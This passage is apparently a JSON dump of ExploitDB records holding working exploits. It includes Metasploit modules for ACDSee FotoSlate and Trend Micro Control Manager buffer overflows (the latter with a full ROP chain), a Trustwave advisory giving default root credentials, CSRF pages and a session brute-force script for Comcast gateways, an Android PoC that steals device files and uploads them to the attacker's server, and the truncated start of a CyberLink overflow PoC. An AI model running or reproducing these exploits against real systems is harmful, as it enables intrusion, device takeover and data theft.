id=\"Border\">FALSE</Bool>\r\n<Int id=\"BorderColor\">16711680</Int>\r\n<Bool id=\"IsLocked\">FALSE</Bool>\r\n</Content>\r\n</Tool>\r\n</Group>\r\n</ToolList>\r\n</Template>\r\n<PageContent>\r\n<Version>3.0</Version>\r\n<Page>\r\n<Name>Letter</Name>\r\n<Content>\r\n<Bool id=\"UseBGColor\">FALSE</Bool>\r\n<Int id=\"BGImageType\">0</Int>\r\n<String id=\"BGImageFile\"></String>\r\n<Int id=\"BGColor\">16777215</Int>\r\n</Content>\r\n</Page>\r\n<ToolList>\r\n<Group>\r\n<Tool>\r\n<Name>Image</Name>\r\n<Content>\r\n<Int id=\"ShapeType\">0</Int>\r\n<Float id=\"RoundRectX\">0.000000</Float>\r\n<Float id=\"RoundRectY\">0.000000</Float>\r\n<Bool id=\"ShrinkToFit\">FALSE</Bool>\r\n<Bool id=\"AutoRotate\">FALSE</Bool>\r\n<Float id=\"BorderWidth\">0.000000</Float>\r\n<Bool id=\"UseBGColor\">FALSE</Bool>\r\n<Int id=\"BGColor\">8454143</Int>\r\n<Bool id=\"DropShadow\">FALSE</Bool>\r\n<Int id=\"DSColor\">0</Int>\r\n<Bool id=\"BevelEdge\">FALSE</Bool>\r\n<Bool id=\"Border\">FALSE</Bool>\r\n<Int id=\"BorderColor\">16711680</Int>\r\n<Bool id=\"IsLocked\">FALSE</Bool>\r\n</Content>\r\n</Tool>\r\n</Group>\r\n</ToolList>\r\n</PageContent>\r\n</PageDefinition>\r\n</ACDFotoSlateDocument15>\r\nTEMPLATE\r\n\r\n\t\tprint_status(\"Creating '#{datastore['FILENAME']}' file ...\")\r\n\t\tfile_create(plp)\r\n\tend\r\n\r\nend\r\n\r\n\r\n=begin\r\nAfter SEH, we have ~0x23C3 bytes (9155 in decimal) of space for payload. But we need to avoid\r\nusing a long buffer in order to avoid the meterpreter possibly being broken.\r\n=end",
                "description": "ACDSee FotoSlate - '.PLP' File 'id' Local Overflow (Metasploit)",
                "author": "Metasploit",
                "_id": 17966,
                "source": "ExploitDB",
                "platform": "windows",
                "date": "2011-10-10T00:00:00+00:00",
                "cve": [],
                "type": "local",
                "port": 0
            },
            {
                "code": "##\r\n# This file is part of the Metasploit Framework and may be subject to\r\n# redistribution and commercial restrictions. Please see the Metasploit\r\n# Framework web site for more information on licensing and terms of use.\r\n#   http://metasploit.com/framework/\r\n##\r\n\r\nrequire 'msf/core'\r\n\r\nclass Metasploit3 < Msf::Exploit::Remote\r\n\tRank = GoodRanking\r\n\r\n\tinclude Msf::Exploit::Remote::Tcp\r\n\r\n\tdef initialize(info={})\r\n\t\tsuper(update_info(info,\r\n\t\t\t'Name'           => \"TrendMicro Control Manger <= v5.5 CmdProcessor.exe Stack Buffer Overflow\",\r\n\t\t\t'Description'    => %q{\r\n\t\t\t\t\tThis module exploits a vulnerability in the CmdProcessor.exe component of Trend\r\n\t\t\t\tMicro Control Manger up to version 5.5.\r\n\r\n\t\t\t\t\tThe specific flaw exists within CmdProcessor.exe service running on TCP port\r\n\t\t\t\t20101. The vulnerable function is the CGenericScheduler::AddTask function of\r\n\t\t\t\tcmdHandlerRedAlertController.dll. When processing a specially crafted IPC packet,\r\n\t\t\t\tcontrolled data is copied into a 256-byte stack buffer. This can be exploited\r\n\t\t\t\tto execute remote code under the context of the user.\r\n\t\t\t},\r\n\t\t\t'License'        => MSF_LICENSE,\r\n\t\t\t'Author'         =>\r\n\t\t\t\t[\r\n\t\t\t\t\t'Luigi Auriemma',  #Initial discovery\r\n\t\t\t\t\t'Blue',            #Metasploit\r\n\t\t\t\t],\r\n\t\t\t'References'     =>\r\n\t\t\t\t[\r\n\t\t\t\t\t['CVE', '2011-5001'],\r\n\t\t\t\t\t['URL', 'http://www.zerodayinitiative.com/advisories/ZDI-11-345/']\r\n\t\t\t\t],\r\n\t\t\t'Payload'        =>\r\n\t\t\t\t{\r\n\t\t\t\t\t'BadChars' => \"\\x00\",\r\n\t\t\t\t},\r\n\t\t\t'DefaultOptions'  =>\r\n\t\t\t\t{\r\n\t\t\t\t\t'ExitFunction' => 'process',\r\n\t\t\t\t},\r\n\t\t\t'Platform'       => 'win',\r\n\t\t\t'Targets'        =>\r\n\t\t\t\t[\r\n\t\t\t\t\t[\r\n\t\t\t\t\t\t# TCM 5.5 cannot be installed in Win2k3 SP0-SP1, Win2k8, or XP\r\n\t\t\t\t\t\t'Windows 2003 Server SP2 (DEP Bypass)',\r\n\t\t\t\t\t\t{\r\n\t\t\t\t\t\t\t'Ret'    => 0x666b34c8, # TMNotify.dll stack pivot\r\n\t\t\t\t\t\t\t'Offset' => 5000\r\n\t\t\t\t\t\t}\r\n\t\t\t\t\t],\r\n\t\t\t\t],\r\n\t\t\t'Privileged'     => false,\r\n\t\t\t'DisclosureDate' => \"Dec 07 2011\",\r\n\t\t\t'DefaultTarget'  => 0))\r\n\r\n\t\t\tregister_options(\r\n\t\t\t[\r\n\t\t\t\tOpt::RPORT(20101)\r\n\t\t\t], self.class)\r\n\tend\r\n\r\n\tdef junk\r\n\t\treturn rand_text(4).unpack(\"L\")[0].to_i\r\n\tend\r\n\r\n\tdef exploit\r\n\r\n\t\t#TmUpdate.dll\r\n\t\trop_chain = [\r\n\t\t\t0x668074d4,\t# POP EDX # OR AL,0F6 # RETN\r\n\t\t\t0x3FCD0FFC,\t# Put 00001000 into edx\r\n\t\t\t0x667611b2,\t# ADD EDX,C0330004 # RETN 04\r\n\t\t\t0x667c99e7,\t# POP EBP # RETN [TmUpdate.dll]\r\n\t\t\tjunk,\r\n\t\t\t0x667c99e7,\t# skip 4 bytes [TmUpdate.dll]\r\n\t\t\t0x667e3250,\t# POP EBX # RETN [TmUpdate.dll]\r\n\t\t\t0xffffffff,\t# NEG EBX\r\n\t\t\t0x6683ab64,\t# INC EBX # XOR EAX,EAX # RETN [TmUpdate.dll]\r\n\t\t\t0x6683ab64,\t# INC EBX # XOR EAX,EAX # RETN [TmUpdate.dll]\r\n\t\t\t0x6680a1d3,\t# POP EAX # RETN [TmUpdate.dll]\r\n\t\t\t0xffffffc0,\t# Value to negate, will become 0x00000040\r\n\t\t\t0x66812b53,\t# NEG EAX # RETN [TmUpdate.dll]\r\n\t\t\t0x667f030a,\t# MOV ECX,EAX # RETN [TmUpdate.dll]\r\n\t\t\t0x667d4c7c,\t# POP EDI # RETN [TmUpdate.dll]\r\n\t\t\t0x667e8003,\t# RETN (ROP NOP) [TmUpdate.dll]\r\n\t\t\t0x667d54d0,\t# POP ESI # RETN [TmUpdate.dll]\r\n\t\t\t0x667baf06,\t# JMP [EAX] [TmUpdate.dll]\r\n\t\t\t0x66833376,\t# POP EAX # RETN [TmUpdate.dll]\r\n\t\t\t0x6686115c,\t# ptr to &VirtualAlloc() [IAT TmUpdate.dll]\r\n\t\t\t0x6681ceb3,\t# PUSHAD # RETN [TmUpdate.dll]\r\n\t\t\t0x668382c3,\t# ptr to 'call esp' [TmUpdate.dll]\r\n\t\t].pack('V*')\r\n\t\t#rop chain generated by mona.py\r\n\r\n\t\theader  = \"\\x00\\x00\"\r\n\t\theader << \"\\x13\\x88\"          #size of buffer\r\n\t\theader << rand_text_alpha(9)\r\n\t\theader << \"\\x15\\x09\\x13\"      #opcode\r\n\t\theader << \"\\x00\\x00\\x00\"\r\n\t\theader << rand_text_alpha(25)\r\n\t\theader << \"\\xFE\\xFF\\xFF\\xFF\"  #in instruction #MOV EDI,DWORD PTR DS:[EAX+ECX] #ECX is our buffer and needs to be readable dword\r\n\t\theader << \"\\xFF\\xFF\\xFF\\xFF\"  #after sum with EAX. Pointer from EAX increments by #LEA EAX,DWORD PTR DS:[EAX+EDI+4] and then is saved\r\n\t\theader << \"\\xFF\\xFF\\xF4\\xFF\"  #and used again. We can essentially walk the loop which increments EBX by 1 until we get to 14 which leads\r\n\t\theader << \"\\xFF\\xFF\"          #us to our vulnerable function\r\n\t\theader << rand_text_alpha(1)  #align stack again for rop\r\n\r\n\t\tpay = rop_chain\r\n\t\tpay << make_nops(374 - rop_chain.length)\r\n\t\tpay << \"\\xeb\\x04\"  #Short jmp 0x04\r\n\t\tpay << [target.ret].pack('V')\r\n\t\tpay << payload.encoded\r\n\r\n\t\tsploit = header\r\n\t\tsploit << pay\r\n\r\n\t\tfiller = rand_text_alpha(target['Offset'] - (sploit.length))\r\n\r\n\t\tconnect\r\n\t\tprint_status(\"Sending request...\")\r\n\t\tsock.put(sploit + filler)\r\n\t\thandler\r\n\t\tdisconnect\r\n\r\n\tend\r\n\r\nend",
                "description": "Trend Micro Control Manger 5.5 - 'CmdProcessor.exe' Remote Stack Buffer Overflow (Metasploit)",
                "author": "Metasploit",
                "_id": 18514,
                "source": "ExploitDB",
                "platform": "windows",
                "date": "2012-02-23T00:00:00+00:00",
                "cve": [],
                "type": "remote",
                "port": 0
            },
            {
                "code": "Trustwave's SpiderLabs Security Advisory TWSL2011-002:\r\nVulnerabilities in Comcast DOCSIS 3.0 Business Gateways\r\n(D3G-CCR)\r\n\r\nhttps://www.trustwave.com/spiderlabs/advisories/TWSL2011-002.txt\r\n\r\nPublished: 2011-02-04\r\nVersion: 1.0\r\n\r\nVendor: Comcast (http://comcast.com)\r\nProduct: Comcast DOCSIS 3.0 Business Gateway - D3G-CCR\r\nVersion affected:  Versions prior to 1.4.0.49.2\r\n\r\nProduct description:\r\nThe Comcast DOCSIS 3.0 Business Gateway provides end-user termination of\r\ncable internet services for Comcast Business Class customers with enhanced\r\nservices including Network Address Translation (NAT), firewalling, and\r\nVirtual Private Network (VPN) termination.\r\n\r\nCredit: Zack Fasel and Matthew Jakubowski of Trustwave's SpiderLabs\r\n\r\nFinding 1: Static Credentials\r\nCVE: CVE-2011-0885\r\n\r\nAll D3G-CCR gateways provided by Comcast have an administrative\r\nlogin of \"mso\" with the password of \"D0nt4g3tme\".  These passwords\r\nare not provided as a part of the installation of the device and are\r\nnot recommended to be changed, thus the majority of users are unaware\r\nof the default configuration.\r\n\r\nWith these default credentials, internal attackers can modify device\r\nconfigurations to leverage more significant attacks, including redirection\r\nof DNS requests, creation of a remote VPN termination point, and\r\nmodification of NAT entries.  These credentials provide access to the web\r\ninterface for management, as well as a telnet interface that provides shell\r\naccess to the device.  The mso login provides shell as UID 0 (root).\r\n\r\n\r\nFinding 2: Cross Site Request Forgery (CSRF)\r\nCVE: CVE-2011-0886\r\nD3G-CCR gateways provided by Comcast permit CSRF attacks against\r\nnumerous management pages allowing an attacker to embed in a webpage a\r\nmalicious request against the gateway's management interface.  Through\r\nthis, an attacker can modify device configuration and enable remote\r\nadministration via a telnet shell and http.\r\n\r\nThe following Proof of Concept (PoC) connects to the gateway, logs in,\r\nmodifies the remote administration to allow any user to connect externally,\r\nand modifies the DNS information.\r\n\r\n## d3g-csrf-poc.htm\r\n\r\n<html>\r\n<body>\r\n<iframe src=\"./d3g-csrf-poc-1.htm\" width=\"1\" height=\"1\">\r\n</iframe>\r\n<iframe src=\"./d3g-csrf-poc-2.htm\" width=\"1\" height=\"1\">\r\n</iframe>\r\n<iframe src=\"./d3g-csrf-poc-3.htm\" width=\"1\" height=\"1\">\r\n</iframe> </body> </html>\r\n\r\n## d3g-csrf-poc-1.htm\r\n\r\n<html>\r\n<body>\r\n<form action=\"http://10.1.10.1/goform/login\" method=\"post\"\r\n\tname=\"tF\">\r\n<input type=\"hidden\" name=\"user\" value=\"mso\" />\r\n<input type=\"hidden\" name=\"pws\" value=\"D0nt4g3tme\" />\r\n</form> <script> document.tF.submit(); </script> </body>\r\n</html>\r\n\r\n## d3g-csrf-poc-2.htm\r\n\r\n<html>\r\n<body>\r\n<form action=\"http://10.1.10.1/goform/RemoteRange\"\r\nname=\"RMangement\" method=\"post\"> <input type=\"hidden\"\r\nvalue=\"feat-admin-remote\" name=\"file\"> <input type=\"hidden\"\r\nvalue=\"admin/\" name=\"dir\"> <input type=\"hidden\"\r\nname=\"RemoteRange\" value=\"0\" /> <input type=\"hidden\"\r\nname=\"rm_access\" value=\"on\" /> <input type=\"hidden\"\r\nname=\"Remote0\" value=\"0.0.0.0,0.0.0.0,1\" /> <input\r\ntype=\"hidden\" name=\"http_port\" value=\"8080\" /> <input\r\ntype=\"hidden\" name=\"http_enable\" value=\"on\" /> <input\r\ntype=\"hidden\" name=\"http_flag\" value=\"1\" /> <input\r\ntype=\"hidden\" name=\"msoremote_enableCheck\" value=\"on\" />\r\n<input type=\"hidden\" name=\"mso_remote_enable\" value=\"1\" />\r\n<input type=\"hidden\" name=\"remote_enable\" value=\"0\" />\r\n<input type=\"hidden\" name=\"https_enable\" value=\"on\" />\r\n<input type=\"hidden\" name=\"https_port\" value=\"8181\" />\r\n<input type=\"hidden\" name=\"https_flag\" value=\"1\" /> <input\r\ntype=\"hidden\" name=\"telnet_enable\" value=\"on\" /> <input\r\ntype=\"hidden\" name=\"telnet_port\" value=\"2323\" /> <input\r\ntype=\"hidden\" name=\"telnet_flag\" value=\"1\" /> <input\r\ntype=\"hidden\" name=\"Remote1=\" value=\"\" /> </form> </body>\r\n</html> <script>\r\nsetTimeout(\"document.RMangement.submit()\",4000);\r\n</script>\r\n</body>\r\n</html>\r\n\r\n## d3g-csrf-poc-3.htm\r\n\r\n<html>\r\n<body>\r\n<form name=\"WanIPform\"\r\naction=\"http://10.1.10.1/goform/Basic\" method=\"post\"> <input\r\ntype=\"hidden\" value=\"feat-wan-ip\" name=\"file\"> <input\r\ntype=\"hidden\" value=\"admin/\" name=\"dir\"> <input\r\ntype=\"hidden\" value=\"Fixed\" name=\"DNSAssign\"> <input\r\ntype=\"hidden\" value=\"0\" name=\"dhcpc_release\"> <input\r\ntype=\"hidden\" value=\"0\" name=\"dhcpc_renew\"> <input\r\ntype=\"hidden\" value=\"\" name=\"domain_name\"> <input\r\ntype=\"hidden\" value=\"\" name=\"WDn\"> <input type=\"hidden\"\r\nname=\"SysName\" value=\"\" /> <input type=\"hidden\"\r\nname=\"manual_dns_enable\" value=\"on\" /> <input type=\"hidden\"\r\nname=\"DAddr\" value=\"4.2.2.1\" /> <input type=\"hidden\"\r\nname=\"DAddr0\" value=\"4\" /> <input type=\"hidden\"\r\nname=\"DAddr1\" value=\"2\" /> <input type=\"hidden\"\r\nname=\"DAddr2\" value=\"2\" /> <input type=\"hidden\"\r\nname=\"DAddr3\" value=\"1\" /> <input type=\"hidden\"\r\nname=\"PDAddr\" value=\"4.2.2.2\" /> <input type=\"hidden\"\r\nname=\"PDAddr0\" value=\"4\" /> <input type=\"hidden\"\r\nname=\"PDAddr1\" value=\"2\" /> <input type=\"hidden\"\r\nname=\"PDAddr2\" value=\"2\" /> <input type=\"hidden\"\r\nname=\"PDAddr3\" value=\"2\" /> </form> <script>\r\nsetTimeout(\"document.WanIPform.submit()\",5000);\r\n</script>\r\n</body>\r\n</html>\r\n\r\nIf the PoC was embedded in any web page the targeted user visited while\r\nlogged into the device, the attacker would be provided remote\r\nadministration in to the gateway device include a telnet shell.  This would\r\nallow the attacker to redirect traffic to a malicious end-point.\r\n\r\n\r\nFinding 3: Weak Session Management \r\nCVE: CVE-2011-0887\r\nD3G-CCR gateways provided by Comcast utilize a predictable value to\r\nvalidate the active web management portal session.  The epoch time of\r\nbeginning of the session is stored as a cookie labeled \"userid\".  This\r\nprovides a predictable range of session IDs that can be brute-forced.\r\n\r\nThe following PoC attempts to brute force the session IDs by requesting the\r\nadmin page with an incrementing cookie and determining whether it wants to\r\nredirect to login.asp.\r\n\r\n## d3g-session-poc.sh\r\n\r\n#!/bin/bash\r\nstart=1267604160\r\nend=1267605960\r\nfor (( i=$start; i<=$end; i++)) do if [ `curl -sb userid=$i\r\nhttp://10.1.10.1/admin/index.asp | grep -c login.asp` -lt\r\n\"1\" ] then echo \"Session ID Found:  $i\"\r\nfi\r\nif [ $(($i % 100)) -eq \"0\" ]\r\nthen echo \"Currently at $i\"\r\nfi\r\ndone\r\n\r\nThrough this, an attacker can brute-force the possible valid session IDs.\r\nSessions do by default expire within 10 minutes, thus the attack window is\r\nlimited but can be leveraged with other attack methods.\r\n\r\n\r\nVendor Response:\r\nThese issues have been addressed as of version 1.4.0.49.2\r\n\r\nRemediation Steps:\r\nIn order to determine if the correct version is installed, users should\r\nview the \"About\" link in the management interface. Versions 1.4.0.49.2 and\r\nabove have been corrected.\r\n\r\nVendor Communication Timeline:\r\n08/30/10 - Vulnerability disclosed\r\n01/21/11 - Patch Released\r\n02/04/11 - Advisory Published\r\n\r\nRevision History:\r\n1.0 Initial publication\r\n\r\n\r\nAbout Trustwave:\r\nTrustwave is the leading provider of on-demand and subscription-based\r\ninformation security and payment card industry compliance management\r\nsolutions to businesses and government entities throughout the world. For\r\norganizations faced with today's challenging data security and compliance\r\nenvironment, Trustwave provides a unique approach with comprehensive\r\nsolutions that include its flagship TrustKeeper compliance management\r\nsoftware and other proprietary security solutions. Trustwave has helped\r\nthousands of organizations--ranging from Fortune 500 businesses and large\r\nfinancial institutions to small and medium-sized retailers--manage\r\ncompliance and secure their network infrastructure, data communications and\r\ncritical information assets. Trustwave is headquartered in Chicago with\r\noffices throughout North America, South America, Europe, Africa, China and\r\nAustralia. For more information, visit https://www.trustwave.com\r\n\r\nAbout Trustwave's SpiderLabs:\r\nSpiderLabs(R) is the advanced security team at Trustwave focused on\r\napplication security, incident response, penetration testing, physical\r\nsecurity and security research. The team has performed over a thousand\r\nincident investigations, thousands of penetration tests and hundreds of\r\napplication security tests globally. In addition, the SpiderLabs Research\r\nteam provides intelligence through bleeding-edge research and proof of\r\nconcept tool development to enhance Trustwave's products and services.\r\nhttps://www.trustwave.com/spiderlabs\r\n\r\nDisclaimer:\r\nThe information provided in this advisory is provided \"as is\" without\r\nwarranty of any kind. Trustwave disclaims all warranties, either express or\r\nimplied, including the warranties of merchantability and fitness for a\r\nparticular purpose. In no event shall Trustwave or its suppliers be liable\r\nfor any damages whatsoever including direct, indirect, incidental,\r\nconsequential, loss of business profits or special damages, even if\r\nTrustwave or its suppliers have been advised of the possibility of such\r\ndamages. Some states do not allow the exclusion or limitation of liability\r\nfor consequential or incidental damages so the foregoing limitation may not\r\napply.",
                "description": "Comcast DOCSIS 3.0 Business Gateways - Multiple Vulnerabilities",
                "author": "Trustwave's SpiderLabs",
                "_id": 16123,
                "source": "ExploitDB",
                "platform": "hardware",
                "date": "2011-02-06T00:00:00+00:00",
                "cve": [
                    "CVE-2011-0885",
                    "CVE-2011-0886",
                    "CVE-2011-0887"
                ],
                "type": "remote",
                "port": 0
            },
            {
                "code": "<?php \r\n/* \r\n* Description:  Android 'content://' URI Multiple Information Disclosure Vulnerabilities\r\n* Bugtraq ID:   48256\r\n* CVE:          CVE-2010-4804\r\n* Affected:     Android < 2.3.4\r\n* Author:       Thomas Cannon\r\n* Discovered:   18-Nov-2010\r\n* Advisory:     http://thomascannon.net/blog/2010/11/android-data-stealing-vulnerability/\r\n*\r\n* Filename:     poc.php\r\n* Instructions: Specify files you want to upload in filenames array. Host this php file\r\n*               on a server and visit it using the Android Browser. Some builds of Android\r\n*               may require adjustments to the script, for example when a German build was\r\n*               tested it downloaded the payload as .htm instead of .html, even though .html\r\n*               was specified. \r\n*\r\n* Tested on:    HTC Desire (UK Version) with Android 2.2\r\n*/\r\n\r\n//  List of the files on the device that we want to upload to our server\r\n$filenames = array(\"/proc/version\",\"/sdcard/img.jpg\");\r\n\r\n//  Determine the full URL of this script\r\n$protocol = $_SERVER[\"HTTPS\"] == \"on\" ? \"https\" : \"http\";\r\n$scripturl = $protocol.\"://\".$_SERVER[\"HTTP_HOST\"].$_SERVER[\"SCRIPT_NAME\"];\r\n\r\n//  Stage 0:  Display introduction text and a link to start the PoC.\r\nfunction stage0($scripturl) {\r\n  echo \"<b>Android < 2.3.4</b><br>Data Stealing Web Page<br><br>Click: <a href=\\\"$scripturl?stage=1\\\">Malicious Link</a>\";\r\n}\r\n\r\n//  Stage 1:  Redirect to Stage 2 which will force a download of the HTML/JS payload, then a few seconds later redirect \r\n//            to the payload. We load the payload using a Content Provider so that the JavaScript is executed in the\r\n//            context of the local device - this is the vulnerability.\r\nfunction stage1($scripturl) {\r\n  echo \"<body onload=\\\"setTimeout('window.location=\\'$scripturl?stage=2\\'',1000);setTimeout('window.location=\\'content://com.android.htmlfileprovider/sdcard/download/poc.html\\'',5000);\\\">\";\r\n}\r\n\r\n//  Stage 2:  Download of payload, the Android browser doesn't prompt for the download which is another vulnerability.\r\n//            The payload uses AJAX calls to read file contents and encodes as Base64, then uploads to server (Stage 3).\r\nfunction stage2($scripturl,$filenames) {\r\n  header(\"Cache-Control: public\");\r\n  header(\"Content-Description: File Transfer\");\r\n  header(\"Content-Disposition: attachment; filename=poc.html\");\r\n  header(\"Content-Type: text/html\");\r\n  header(\"Content-Transfer-Encoding: binary\");\r\n?>\r\n<html>\r\n  <body>\r\n    <script language='javascript'>\r\n      var filenames = Array('<?php echo implode(\"','\",$filenames); ?>');\r\n      var filecontents = new Array();\r\n      function processBinary(xmlhttp) {\r\n        data = xmlhttp.responseText;    r = '';   size = data.length;\r\n        for(var i = 0; i < size; i++)   r += String.fromCharCode(data.charCodeAt(i) & 0xff);\r\n        return r;\r\n      }\r\n      function getFiles(filenames) {\r\n        for (var filename in filenames) {\r\n          filename = filenames[filename];\r\n          xhr = new XMLHttpRequest();\r\n          xhr.open('GET', filename, false);\r\n          xhr.overrideMimeType('text/plain; charset=x-user-defined');\r\n          xhr.onreadystatechange = function() { if (xhr.readyState == 4) { filecontents[filename] = btoa(processBinary(xhr)); } }\r\n          xhr.send();\r\n        }\r\n      }\r\n      function addField(form, name, value) {\r\n        var fe = document.createElement('input');\r\n        fe.setAttribute('type', 'hidden');\r\n        fe.setAttribute('name', name);\r\n        fe.setAttribute('value', value);\r\n        form.appendChild(fe);\r\n      }\r\n      function uploadFiles(filecontents) {\r\n        var form = document.createElement('form');\r\n        form.setAttribute('method', 'POST');\r\n        form.setAttribute('enctype', 'multipart/form-data');\r\n        form.setAttribute('action', '<?=$scripturl?>?stage=3');\r\n        var i = 0;\r\n        for (var filename in filecontents) {\r\n          addField(form, 'filename'+i, btoa(filename));\r\n          addField(form, 'data'+i, filecontents[filename]);\r\n          i += 1;\r\n        }\r\n        document.body.appendChild(form);\r\n        form.submit();\r\n      }\r\n      getFiles(filenames);\r\n      uploadFiles(filecontents);\r\n    </script>\r\n  </body>\r\n</html>\r\n<?php\r\n}\r\n\r\n//  Stage 3:  Read the file names and contents sent by the payload and write to a file on the server.\r\nfunction stage3() {\r\n  $fp = fopen(\"files.txt\", \"w\") or die(\"Couldn't open file for writing!\");\r\n  fwrite($fp, print_r($_POST, TRUE)) or die(\"Couldn't write data to file!\"); \r\n  fclose($fp); \r\n  echo \"Data uploaded to <a href=\\\"files.txt\\\">files.txt</a>!\";\r\n}\r\n\r\n//  Select the stage to run depending on the parameter passed in the URL\r\nswitch($_GET[\"stage\"]) { \r\n  case \"1\": \r\n    stage1($scripturl); \r\n    break; \r\n  case \"2\": \r\n    stage2($scripturl,$filenames); \r\n    break; \r\n  case \"3\": \r\n    stage3(); \r\n    break;\r\n  default: \r\n    stage0($scripturl); \r\n    break; \r\n} \r\n?>",
                "description": "Google Android - 'content://' URI Multiple Information Disclosure Vulnerabilities",
                "author": "Thomas Cannon",
                "_id": 18164,
                "source": "ExploitDB",
                "platform": "android",
                "date": "2011-11-28T00:00:00+00:00",
                "cve": [
                    "CVE-2010-4804"
                ],
                "type": "webapps",
                "port": 0
            },
            {
                "code": "#!/usr/bin/python\r\n# \r\n# Exploit Title: CyberLink Multiple Products File Project Handling Stack Buffer Overflow POC\r\n# by: modpr0be[at]spentera[dot]com (@modpr0be)\r\n# Platform: Windows\r\n# Tested on: Windows XP SP3, Windows 7 SP1 with:\r\n# \tCyberLink Power2Go 7 (build 196)\r\n# \tCyberLink Power2Go 8 (build 1031)\r\n# \tCyberLink WaveEditor 2.0 (build 2204)\r\n# Software Link: http://www.cyberlink.com/downloads/trials/index_en_US.html\r\n# CVE : -\r\n\r\n### Software Description\r\n# CyberLink Power2Go is all-media disc burning software. \r\n# Copy all your media to any disc with Power2Go 8! With new System Recovery tools \r\n# and over 5000 free DVD menus to choose from on DirectorZone.com, Power2Go 8 not \r\n# only burns everything but allows you to create pro-like DVDs, rip CDs and \r\n# safeguard valuable data. \r\n\r\n# CyberLink Wave Editor will help user to convert audio format when producing, editing, \r\n# or creating backups for some audios or videos. This additional tools is also included \r\n# since PowerDirector 9 to PowerDirector 10, and now included on Power2Go 8.\r\n\r\n### Vulnerability Details\r\n# Most of CyberLink products contain built-in project file with their own format and\r\n# extension. This file usually contains our recently modified project or work.\r\n# Most of this filetypes contain this section:\r\n#     <File src=\r\n#     <File name=\r\n# Generally, those sections will be filled with source path or filename. \r\n# both products will lead us to command execution because the address of \r\n# SE Handler is overwritten with 0x00410041.\r\n\r\n# Notes:\r\n# I cannot find any good return address for WaveEditor, if you can make it\r\n# through the hard way, kudos!!\r\n\r\n### Vendor logs:\r\n# 10/10/2011 - Bug found\r\n# 10/11/2011 - Vendor contacted\r\n# 10/11/2011 - Vendor replied and requested POC\r\n# 10/11/2011 - POC sent to vendor\r\n# 10/31/2011 - Vendor said the POC will be researched\r\n# 10/27/2011 - Submitted to CERT\r\n# 11/09/2011 - CyberLink updated the product\r\n# 11/09/2011 - POC still works on the latest version\r\n# 12/09/2011 - No response from vendor, POC release.\r\n\r\nimport time,sys\r\n\r\ndef power2go():\r\n\t# header for power2go\r\n\theader = (\r\n\t\"\\x3c\\x50\\x72\\x6f\\x6a\\x65\\x63\\x74\\x20\\x6d\\x61\\x67\\x69\\x63\"\r\n\t\"\\x3d\\x22\\x69\\x6e\\x73\\x65\\x63\\x75\\x72\\x69\\x74\\x79\\x22\\x20\"\r\n\t\"\\x76\\x65\\x72\\x73\\x69\\x6f\\x6e\\x3d\\x22\\x31\\x30\\x31\\x22\\x3e\"\r\n\t\"\\x0d\\x0a\\x3c\\x49\\x6e\\x66\\x6f\\x72\\x6d\\x61\\x74\\x69\\x6f\\x6e\"\r\n\t\"\\x2f\\x3e\\x0d\\x0a\\x3c\\x43\\x6f\\x6d\\x70\\x69\\x6c\\x61\\x74\\x69\"\r\n\t\"\\x6f\\x6e\\x3e\\x0d\\x0a\\x3c\\x44\\x61\\x74\\x61\\x44\\x69\\x73\\x63\"\r\n\t\"\\x20\\x0d\\x0a\\x64\\x69\\x73\\x63\\x4e\\x61\\x6d\\x65\\x3d\\x22\\x49\"\r\n\t\"\\x4e\\x53\\x45\\x43\\x55\\x52\\x49\\x54\\x59\\x22\\x20\\x0d\\x0a\\x66\"\r\n\t\"\\x69\\x6c\\x65\\x44\\x61\\x74\\x65\\x3d\\x22\\x6f\\x72\\x69\\x67\\x69\"\r\n\t\"\\x6e\\x61\\x6c\\x22\\x20\\x66\\x69\\x6c\\x65\\x54\\x69\\x6d\\x65\\x3d\"\r\n\t\"\\x22\\x30\\x22\\x20\\x0d\\x0a\\x64\\x69\\x73\\x63\\x54\\x79\\x70\\x65\"\r\n\t\"\\x3d\\x22\\x63\\x64\\x22\\x20\\x0d\\x0a\\x73\\x65\\x73\\x73\\x69\\x6f\"\r\n\t\"\\x6e\\x53\\x69\\x7a\\x65\\x3d\\x22\\x30\\x22\\x20\\x0d\\x0a\\x50\\x4f\"\r\n\t\"\\x57\\x42\\x75\\x72\\x6e\\x65\\x64\\x53\\x69\\x7a\\x65\\x3d\\x22\\x30\"\r\n\t\"\\x22\\x20\\x0d\\x0a\\x53\\x65\\x63\\x75\\x72\\x65\\x64\\x44\\x61\\x74\"\r\n\t\"\\x61\\x3d\\x22\\x66\\x61\\x6c\\x73\\x65\\x22\\x20\\x0d\\x0a\\x57\\x68\"\r\n\t\"\\x6f\\x6c\\x65\\x53\\x65\\x63\\x75\\x72\\x65\\x64\\x44\\x61\\x74\\x61\"\r\n\t\"\\x3d\\x22\\x66\\x61\\x6c\\x73\\x65\\x22\\x20\\x0d\\x0a\\x53\\x65\\x63\"\r\n\t\"\\x75\\x72\\x69\\x74\\x79\\x4b\\x65\\x79\\x53\\x69\\x7a\\x65\\x3d\\x22\"\r\n\t\"\\x31\\x36\\x22\\x20\\x0d\\x0a\\x48\\x69\\x64\\x65\\x46\\x69\\x6c\\x65\"\r\n\t\"\\x4e\\x61\\x6d\\x65\\x3d\\x22\\x66\\x61\\x6c\\x73\\x65\\x22\\x20\\x0d\"\r\n\t\"\\x0a\\x62\\x6f\\x6f\\x74\\x61\\x62\\x6c\\x65\\x3d\\x22\\x66\\x61\\x6c\"\r\n\t\"\\x73\\x65\\x22\\x20\\x0d\\x0a\\x62\\x6f\\x6f\\x74\\x46\\x6c\\x6f\\x70\"\r\n\t\"\\x70\\x79\\x3d\\x22\\x66\\x61\\x6c\\x73\\x65\\x22\\x20\\x0d\\x0a\\x62\"\r\n\t\"\\x6f\\x6f\\x74\\x49\\x6d\\x61\\x67\\x65\\x3d\\x22\\x22\\x20\\x0d\\x0a\"\r\n\t\"\\x61\\x75\\x74\\x6f\\x52\\x75\\x6e\\x45\\x78\\x65\\x3d\\x22\\x66\\x61\"\r\n\t\"\\x6c\\x73\\x65\\x22\\x20\\x0d\\x0a\\x61\\x75\\x74\\x6f\\x52\\x75\\x6e\"\r\n\t\"\\x45\\x78\\x65\\x50\\x61\\x74\\x68\\x3d\\x22\\x22\\x20\\x0d\\x0a\\x61\"\r\n\t\"\\x75\\x74\\x6f\\x52\\x75\\x6e\\x49\\x63\\x6f\\x6e\\x3d\\x22\\x66\\x61\"\r\n\t\"\\x6c\\x73\\x65\\x22\\x20\\x0d\\x0a\\x61\\x75\\x74\\x6f\\x52\\x75\\x6e\"\r\n\t\"\\x49\\x63\\x6f\\x6e\\x50\\x61\\x